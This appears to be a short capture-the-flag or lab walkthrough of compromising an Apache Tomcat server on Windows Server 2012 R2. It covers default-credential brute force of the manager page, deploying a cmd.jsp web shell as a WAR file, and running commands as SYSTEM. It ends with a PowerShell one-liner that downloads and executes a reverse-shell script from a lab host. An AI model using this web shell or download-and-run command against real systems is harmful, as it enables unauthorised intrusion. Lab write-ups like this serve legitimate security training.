# 10 - Tomcat


# Index
![](vx_images/5193037766403.png)

# Manager App button prompts us for credentials

![](vx_images/4676847555495.png)


# /manager/html Brute-force with default credentials 
![](vx_images/4356854208880.png)


# Windows Server 2012 R2
![](vx_images/1386965901246.png)

# [cmd.jsp](https://github.com/SecurityRiskAdvisors/cmd.jsp)

![](vx_images/3716831859650.png)

![](vx_images/1831961546292.png)

Select *cmd.war* and hit *Deploy*. *.war* files are basically zipped java servlets 

Once it's deployed click /cmd on application list
![](vx_images/3349660092770.png)


![](vx_images/4686908907114.png)

New application doesn't have a default page we know that war file includes our cmd.jsp


# cmd/cmd.jsp

![](vx_images/434619777300.png)


# Code execution as system
![](vx_images/2029451871440.png)



# Download a reverse shell  and execute it
```powershell
powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.12/reverse.ps1')
```

![](vx_images/1326502502980.png)

